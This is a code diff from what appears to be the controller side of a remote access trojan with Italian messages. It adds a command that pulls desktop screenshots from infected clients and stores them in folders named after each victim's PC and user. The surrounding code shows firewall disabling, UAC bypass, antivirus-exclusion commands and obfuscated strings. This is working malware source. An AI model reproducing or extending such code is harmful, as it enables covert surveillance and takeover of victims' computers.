@@ -1294,6 +1294,99 @@ bool DisableFirewall(SOCKET Sock, int ID)
     return true;
 }
 
+
+/** Decompress an STL string using zlib and return the original data. */
+string decompress_string(const string& str)
+{
+    z_stream zs;                        // z_stream is zlib's control structure
+    memset(&zs, 0, sizeof(zs));
+
+    if (inflateInit(&zs) != Z_OK)
+        throw(runtime_error("inflateInit failed while decompressing."));
+
+    zs.next_in = (Bytef*)str.data();
+    zs.avail_in = str.size();
+
+    int ret;
+    char outbuffer[32768];
+    string outstring;
+
+    // get the decompressed bytes blockwise using repeated calls to inflate
+    do {
+        zs.next_out = reinterpret_cast<Bytef*>(outbuffer);
+        zs.avail_out = sizeof(outbuffer);
+
+        ret = inflate(&zs, 0);
+
+        if (outstring.size() < zs.total_out) {
+            outstring.append(outbuffer,
+                zs.total_out - outstring.size());
+        }
+
+    } while (ret == Z_OK);
+
+    inflateEnd(&zs);
+
+    if (ret != Z_STREAM_END) {          // an error occurred that was not EOF
+        ostringstream oss;
+        oss << "Exception during zlib decompression: (" << ret << ") "
+            << zs.msg;
+        throw(runtime_error(oss.str()));
+    }
+
+    return outstring;
+}
+
+bool Screenshot(SOCKET Sock, int ID)
+{
+    DirUtils du;
+    TextColor tc;
+    SystemUtils su;
+
+    string FileContent;
+    string FileName = DateTime::GetDateTime('-', '_', '.') + ".jpg";
+    string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;
+
+    FileContent = COMUNICAZIONI::PingPong(Sock, "screenshot");
+
+    if (FileContent == "")
+        return false;
+
+    if (!du.CheckDir(LocalFolder))
+        if (!du.MakeDir(LocalFolder))
+        {
+            tc.SetColor(tc.Red);
+            cout << "Failed: unable to create local Client folder.";
+            tc.SetColor(tc.Default);
+            return true;
+        }
+
+    LocalFolder += "\\Screenshots";
+
+    if (!du.CheckDir(LocalFolder))
+        if (!du.MakeDir(LocalFolder))
+        {
+            tc.SetColor(tc.Red);
+            cout << "Failed: unable to create local Screenshots folder.";
+            tc.SetColor(tc.Default);
+            return true;
+        }
+
+    FileContent = decompress_string(FileContent);
+
+    if (!du.WriteBinaryFile(LocalFolder + "\\" + FileName, FileContent))
+    {
+        tc.SetColor(tc.Red);
+        cout << "Failed: unable to save local file.";
+        tc.SetColor(tc.Default);
+        return true;
+    }
+
+    su.NoOutputCMD("start \"\" \"" + LocalFolder + "\\" + FileName + "\"");
+
+    return true;
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -1334,6 +1427,10 @@ void Sessione(int ID, SOCKET Sock)
 			StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
             StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
             StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall."));
+            cout << endl;
+
+            cli.SubTitle("Desktop", 30, tc.SkyBlue);
+            StampaHelp("Screenshot\t", "- Scarica uno screenshot del desktop.");
             cout << endl;
 
             cli.SubTitle("Fun", 30, tc.Yellow);
@@ -1512,6 +1609,16 @@ void Sessione(int ID, SOCKET Sock)
                 }
                 else
                     cout << "Il Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
+            }
+        }
+        else if (cmd == "screenshot")
+        {
+            if (Clients[ID].info.CompatibleVer < 4)
+                StampaIncompatibile();
+            else
+            {
+                if (!Screenshot(Sock, ID))
+                    Controllo = CheckConnection(Sock, ID);
             }
         }
         else
